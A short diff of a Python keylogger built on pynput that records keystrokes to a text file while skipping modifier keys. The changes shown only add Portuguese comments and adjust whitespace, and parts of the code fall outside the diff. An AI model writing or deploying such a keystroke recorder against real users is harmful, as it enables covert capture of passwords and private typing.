@@ -1,5 +1,7 @@
+#Bibliotecas usadas 
 from pynput import keyboard
 
+#Teclas a serem ignoradas
 IGNORAR = {
     keyboard.Key.shift,
     keyboard.Key.shift_r,
@@ -11,6 +13,7 @@ IGNORAR = {
     keyboard.Key.cmd
 }
 
+#Função a ser executada, com teclas ignoradas e o criando o arquivo .txt com o resultado
 def on_press(key):
     try:
         #Se for uma tecla normal (letra, número ou símbolo)
@@ -33,6 +36,7 @@ def on_press(key):
                 pass
             else:
                 f.write(f"[{key}]")
-                
+
+#Execução
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
